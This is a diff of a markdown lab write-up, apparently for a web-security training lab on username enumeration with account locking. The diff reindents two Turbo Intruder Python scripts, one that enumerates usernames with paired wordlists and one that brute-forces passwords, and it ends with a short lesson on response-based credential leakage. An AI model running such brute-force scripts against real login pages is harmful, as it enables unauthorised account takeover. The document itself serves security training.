@@ -13,13 +13,13 @@ This lab is vulnerable to username enumeration. It uses account locking, but thi
 
 # Turbo Intruder Code
 - First code to enumerate valid username:
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=1,
-                           requestsPerConnection=5,
-                           pipeline=False,
-                           engine=Engine.THREADED
-                           )
+    def queueRequests(target, wordlists):
+        engine = RequestEngine(endpoint=target.endpoint,
+            concurrentConnections=1,
+            requestsPerConnection=5,
+            pipeline=False,
+            engine=Engine.THREADED
+    )
 
     with open("/home/duong/username.txt", "r") as f:
         username = [line.strip() for line in f if line.strip()]
@@ -27,25 +27,24 @@ def queueRequests(target, wordlists):
     for u in username:
         for p in password:
             engine.queue(target.req, [u, p])
-def handleResponse(req, interesting):
-    table.add(req)
+    def handleResponse(req, interesting):
+        table.add(req)
 
 - Second code to brute force password:
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=3,
-                           requestsPerConnection=10,
-                           pipeline=False,
-                           engine=Engine.THREADED
-                           )
+    def queueRequests(target, wordlists):
+        engine = RequestEngine(endpoint=target.endpoint,
+            concurrentConnections=3,
+            requestsPerConnection=10,
+            pipeline=False,
+            engine=Engine.THREADED
+    )
 
-    
     with open("/home/duong/password.txt", "r") as f:
         password = [line.strip() for line in f if line.strip()]
     for p in password:
         engine.queue(target.req, [p])
-def handleResponse(req, interesting):
-    table.add(req)
+    def handleResponse(req, interesting):
+        table.add(req)
 
 # Learned:
 - Flawed Logic of this lab is the diffirent responses in diffirent cases makes attackers can identify credential info
